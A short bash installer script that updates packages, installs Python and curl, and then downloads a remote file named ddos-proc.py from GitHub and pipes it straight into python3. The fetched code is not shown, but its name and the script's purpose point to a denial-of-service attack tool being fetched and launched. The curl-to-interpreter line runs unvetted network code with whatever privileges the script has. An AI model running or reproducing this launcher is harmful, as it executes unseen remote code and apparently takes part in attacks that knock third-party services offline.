#!/bin/bash

set -e

echo "[INFO] Updating packages..."
apt update -y

echo "[INFO] Installing Python3 and dependencies..."
apt install -y \
    python3 \
    python3-pip \
    python3-requests \
    curl

echo "[INFO] Running remote Python script..."
curl -fsSL https://raw.githubusercontent.com/LakshyaTheMinecrafter/skript.sh/main/ddos-proc.py | python3
